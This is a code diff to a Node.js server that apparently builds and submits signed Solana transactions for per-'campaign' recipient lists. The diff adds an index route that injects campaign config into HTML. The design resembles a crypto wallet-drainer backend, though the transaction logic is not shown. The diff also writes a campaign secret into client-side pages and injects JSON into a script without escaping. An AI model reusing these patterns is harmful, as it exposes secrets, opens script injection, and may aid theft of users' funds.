@@ -1,5 +1,6 @@
 import http from "node:http";
 import crypto from "node:crypto";
+import fs from "node:fs";
 import "dotenv/config";
 import { buildPlan, submitSigned, makeConnection } from "./core.js";
 import { loadAltAuthority, ensureAlt, defaultAltAddresses } from "./alt.js";
@@ -29,6 +30,41 @@ const RECIPIENT_SET = new Set(RECIPIENTS);
 const connection = makeConnection(RPC);
 const altAuthority = ENABLE_ALT ? loadAltAuthority() : null;
 
+// ------------------------------------------------------------------
+// index.html rendering — campaign config injected per-request
+// ------------------------------------------------------------------
+const INDEX_HTML_PATH = new URL("./index.html", import.meta.url);
+const CONFIG_MARKER = "/*__NOVA_CONFIG__*/";
+let _indexHtml = null;
+
+function getIndexHtml() {
+  if (_indexHtml === null) {
+    _indexHtml = fs.readFileSync(INDEX_HTML_PATH, "utf8");
+  }
+  return _indexHtml;
+}
+
+function renderIndex(campaign) {
+  const cfg = {
+    campaignId: campaign?.id || null,
+    recipients: campaign ? [campaign.recipient] : RECIPIENTS,
+    mode: campaign?.mode || "auto",
+    liquidMints: campaign?.liquidMints || [],
+    secret: campaign?.secret || null,
+    planUrl: "/plan",
+    submitUrl: "/submit",
+  };
+  const html = getIndexHtml();
+  if (!html.includes(CONFIG_MARKER)) return html;
+  return html.replace(
+    CONFIG_MARKER,
+    `window.NOVA_CONFIG = ${JSON.stringify(cfg)};`,
+  );
+}
+
+// ------------------------------------------------------------------
+// helpers
+// ------------------------------------------------------------------
 function json(res, code, body) {
   res.writeHead(code, {
     "content-type": "application/json",
@@ -93,6 +129,21 @@ async function ensureCampaignAlt(campaign) {
     console.error("[alt] ensure failed:", err.message);
     return null;
   }
+}
+
+// ------------------------------------------------------------------
+// routes
+// ------------------------------------------------------------------
+function handleIndex(req, res) {
+  const url = new URL(req.url, `http://${req.headers.host || "localhost"}`);
+  const id = url.searchParams.get("id");
+  const campaign = id ? store.get(id) : null;
+
+  res.writeHead(200, {
+    "content-type": "text/html; charset=utf-8",
+    "cache-control": "no-store",
+  });
+  res.end(renderIndex(campaign));
 }
 
 function handleBundle(req, res) {
@@ -243,6 +294,9 @@ function log(event, fields) {
   console.log(JSON.stringify({ t: new Date().toISOString(), event, ...fields }));
 }
 
+// ------------------------------------------------------------------
+// dispatcher
+// ------------------------------------------------------------------
 const server = http.createServer(async (req, res) => {
   if (req.method === "OPTIONS") {
     res.writeHead(204, {
@@ -252,15 +306,25 @@ const server = http.createServer(async (req, res) => {
     });
     return res.end();
   }
+
   try {
-    if (req.method === "GET" && req.url.startsWith("/bundle.js"))
-      return await handleBundle(req, res);
-    if (req.method === "POST" && req.url === "/plan")
+    const url = new URL(req.url, `http://${req.headers.host || "localhost"}`);
+
+    if (req.method === "GET" && url.pathname === "/")
+      return handleIndex(req, res);
+
+    if (req.method === "GET" && url.pathname === "/bundle.js")
+      return handleBundle(req, res);
+
+    if (req.method === "POST" && url.pathname === "/plan")
       return await handlePlan(req, res);
-    if (req.method === "POST" && req.url === "/submit")
+
+    if (req.method === "POST" && url.pathname === "/submit")
       return await handleSubmit(req, res);
-    if (req.method === "GET" && req.url === "/health")
+
+    if (req.method === "GET" && url.pathname === "/health")
       return json(res, 200, { ok: true, alt: ENABLE_ALT, cnft: ENABLE_CNFT });
+
     json(res, 404, { error: "not found" });
   } catch (err) {
     json(res, 400, { error: err.message });
